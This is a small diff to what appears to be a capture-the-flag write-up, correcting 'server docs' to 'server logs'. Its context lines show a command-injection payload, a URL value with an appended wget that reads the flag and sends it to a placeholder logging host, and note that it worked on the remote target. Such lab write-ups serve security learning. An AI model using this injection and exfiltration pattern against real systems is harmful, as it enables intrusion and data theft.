@@ -116,6 +116,6 @@ For that the idea is to read the flag and make an http request to some webserver
 http:./ & wget <some-url-where-we-can-view-logs>?data=`wget localhost:1337/flag -O -`
 ```
 
-And indeed, if we run this in our docker, we can see the fake flag being submitted in the docker logs, and the fake flag arriving in our server docs.
+And indeed, if we run this in our docker, we can see the fake flag being submitted in the docker logs, and the fake flag arriving in our server logs.
 
 If we now use this exploit url on the remote, we **receive our flag!**
